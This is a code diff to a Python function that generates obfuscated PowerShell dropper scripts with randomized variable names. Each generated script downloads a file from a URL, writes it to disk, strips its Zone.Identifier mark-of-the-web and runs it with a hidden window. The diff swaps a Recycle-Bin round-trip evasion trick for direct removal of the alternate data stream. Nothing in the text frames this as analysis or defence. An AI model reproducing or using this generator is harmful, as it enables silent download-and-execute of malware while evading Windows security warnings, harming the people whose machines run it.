@@ -294,8 +294,6 @@ def generate_ps1_recycle(encrypt_map, decrypt_map):
     dv5 = random_var_name()  # fullPath
     dv6 = random_var_name()  # bytes
     dv7 = random_var_name()  # b64
-    dv8 = random_var_name()  # shell
-    dv9 = random_var_name()  # rb
 
     script_template = (
         f'[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12\n'
@@ -308,20 +306,7 @@ def generate_ps1_recycle(encrypt_map, decrypt_map):
         f'${dv6} = ${dv2}.downloaddata(${dv3})\n'
         f'${dv7} = [convert]::tobase64string(${dv6})\n'
         f'[io.file]::writeallbytes(${dv5}, [convert]::frombase64string(${dv7}))\n'
-        f'add-type -assemblyname microsoft.visualbasic\n'
-        f'[microsoft.visualbasic.fileio.filesystem]::deletefile(${dv5}, '
-        f'[microsoft.visualbasic.fileio.uioption]::OnlyErrorDialogs, '
-        f'[microsoft.visualbasic.fileio.recycleoption]::SendToRecycleBin)\n'
-        f'start-sleep -milliseconds 800\n'
-        f'${dv8} = new-object -comobject shell.application\n'
-        f'${dv9} = ${dv8}.namespace(10)\n'
-        f'foreach ($item in ${dv9}.items()) {{\n'
-        f'  if ($item.name -eq ${dv4}) {{\n'
-        f'    ${dv8}.namespace(${dv1}).movehere($item, 0x14)\n'
-        f'    break\n'
-        f'  }}\n'
-        f'}}\n'
-        f'start-sleep -milliseconds 800\n'
+        f'if (test-path ${dv5}) {{ remove-item -path ${dv5} -stream zone.identifier -erroraction silentlycontinue }}\n'
         f'start-process -filepath ${dv5} -windowstyle hidden'
     )
 
